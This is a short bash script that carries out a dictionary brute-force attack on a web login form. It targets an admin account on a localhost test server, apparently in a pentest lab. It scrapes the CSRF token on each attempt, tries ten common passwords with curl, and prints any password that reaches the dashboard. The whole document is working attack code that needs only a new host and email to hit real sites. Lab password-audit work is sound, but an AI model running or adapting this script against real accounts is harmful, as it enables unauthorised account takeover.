TARGET_EMAIL="admin@pentest.local"
WORDLIST=("123456" "password" "admin" "admin123" "letmein" "qwerty" "abc123" "monkey" "master" "dragon")

echo "🔨 Starting brute force attack on $TARGET_EMAIL"
for pass in "${WORDLIST[@]}"; do
    TOKEN=$(curl -s -c cookies.txt http://localhost:8000/login | grep -oP 'name="_token" value="\K[^"]+')
    RESPONSE=$(curl -s -b cookies.txt -X POST http://localhost:8000/login \
        -d "email=${TARGET_EMAIL}&password=${pass}&_token=${TOKEN}" -L -w "\n%{http_code}" )

    HTTP_CODE=$(echo "$RESPONSE" | tail -1)
    echo "Trying: $pass → HTTP $HTTP_CODE"

    if echo "$RESPONSE" | grep -q "Dashboard"; then
        echo "🎯 PASSWORD FOUND: $pass"
        break
    fi
done
